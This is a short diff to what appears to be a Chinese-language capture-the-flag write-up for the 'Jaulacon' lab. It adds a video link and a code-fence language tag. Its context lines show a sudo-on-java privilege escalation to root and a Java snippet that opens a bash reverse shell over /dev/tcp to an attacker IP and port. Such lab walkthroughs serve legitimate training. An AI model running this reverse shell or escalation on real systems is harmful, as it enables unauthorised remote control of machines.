@@ -2,6 +2,8 @@
 
 2025.03.08 https://thehackerslabs.com/jaulacon/
 
+[video]()
+
 ## Ip
 
 192.168.5.40
@@ -129,7 +131,7 @@ sudo -l 显示 (root) NOPASSWD: /usr/bin/java 直接提权到 root：
 
 创建 shell.java 文件：
 
-```
+```java
 public class shell {
     public static void main(String[] args) {
         ProcessBuilder pb = new ProcessBuilder("bash", "-c", "$@| bash -i >& /dev/tcp/192.168.5.3/8888 0>&1")
